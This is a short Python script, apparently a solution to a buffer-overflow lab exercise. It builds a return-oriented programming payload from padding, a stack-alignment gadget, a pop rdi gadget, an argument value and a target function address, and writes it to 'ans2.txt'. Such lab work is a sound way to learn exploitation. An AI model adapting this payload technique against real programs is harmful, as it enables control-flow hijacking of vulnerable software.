import struct

# Addresses
# Gadget pop rdi; ret is at 4012c7
pop_rdi = 0x4012c7
func2_addr = 0x401216
expected_arg = 0x3f8
ret_gadget = 0x40101a # Gadget to fix stack alignment

# Offset
padding = b'A' * 16

# Payload
# Add ret gadget for alignment
payload = padding
payload += struct.pack('<Q', ret_gadget) 
payload += struct.pack('<Q', pop_rdi)
payload += struct.pack('<Q', expected_arg)
payload += struct.pack('<Q', func2_addr)

with open('ans2.txt', 'wb') as f:
    f.write(payload)

print("Created ans2.txt")
